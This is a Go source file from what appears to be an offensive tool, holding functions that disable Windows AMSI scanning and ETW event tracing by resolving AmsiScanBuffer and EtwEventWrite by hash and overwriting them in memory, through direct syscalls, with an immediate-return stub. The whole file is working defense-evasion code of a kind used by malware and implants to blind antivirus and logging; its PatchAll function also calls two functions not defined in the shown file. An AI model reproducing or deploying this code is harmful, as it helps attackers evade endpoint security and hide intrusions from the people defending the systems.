package evasion

import (
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
	"toxoglosser/core"
)

// PatchAMSI bypasses AMSI by using direct syscalls and manual API resolution (unhooking approach)
func PatchAMSI() error {
	// Get the address of AmsiScanBuffer using manual resolution instead of LazyDLL
	amsiDll, err := core.GetModuleHandleByHash("amsi.dll")
	if err != nil {
		return nil // AMSI not present
	}

	amsiScanBufferAddr, err := core.GetProcAddressByHash(windows.Handle(amsiDll), "AmsiScanBuffer")
	if err != nil {
		return nil // AmsiScanBuffer not found
	}

	// Create a patch that returns S_OK immediately (0)
	// x64 assembly: xor eax, eax; ret
	patch := []byte{0x33, 0xC0, 0xC3}

	// Change memory protection to read-write-execute using direct syscalls
	oldProtect := uint32(0)
	regionSize := uintptr(len(patch))

	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &amsiScanBufferAddr, &regionSize, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return err
	}

	// Write the patch
	copyMemory(unsafe.Pointer(amsiScanBufferAddr), unsafe.Pointer(&patch[0]), len(patch))

	// Restore original memory protection
	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &amsiScanBufferAddr, &regionSize, oldProtect, &oldProtect)
	if err != nil {
		return err
	}

	return nil
}

// PatchETW bypasses ETW by using direct syscalls and manual API resolution (unhooking approach)
func PatchETW() error {
	// Get the address of EtwEventWrite from ntdll using manual resolution
	ntdllModule, err := core.GetModuleHandleByHash("ntdll.dll")
	if err != nil {
		return err
	}

	etwEventWriteAddr, err := core.GetProcAddressByHash(windows.Handle(ntdllModule), "EtwEventWrite")
	if err != nil {
		return nil // EtwEventWrite not found or not present
	}

	// Create a patch that returns STATUS_SUCCESS immediately (0)
	// x64 assembly: xor eax, eax; ret
	patch := []byte{0x33, 0xC0, 0xC3}

	// Change memory protection to read-write-execute using direct syscalls
	oldProtect := uint32(0)
	regionSize := uintptr(len(patch))

	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &etwEventWriteAddr, &regionSize, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return err
	}

	// Write the patch
	copyMemory(unsafe.Pointer(etwEventWriteAddr), unsafe.Pointer(&patch[0]), len(patch))

	// Restore original memory protection
	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &etwEventWriteAddr, &regionSize, oldProtect, &oldProtect)
	if err != nil {
		return err
	}

	return nil
}

// copyMemory copies memory from source to destination
func copyMemory(dst, src unsafe.Pointer, length int) {
	for i := 0; i < length; i++ {
		*(*byte)(unsafe.Pointer(uintptr(dst) + uintptr(i))) = *(*byte)(unsafe.Pointer(uintptr(src) + uintptr(i)))
	}
}

// PatchAll in-memory protections at once
func PatchAll() error {
	// Patch AMSI first
	err := PatchAMSIWithUnhooking()
	if err != nil {
		// Don't return error if AMSI patching fails, just continue
	}

	// Patch ETW
	err = PatchETWWithUnhooking()
	if err != nil {
		// Don't return error if ETW patching fails, just continue
	}

	return nil
}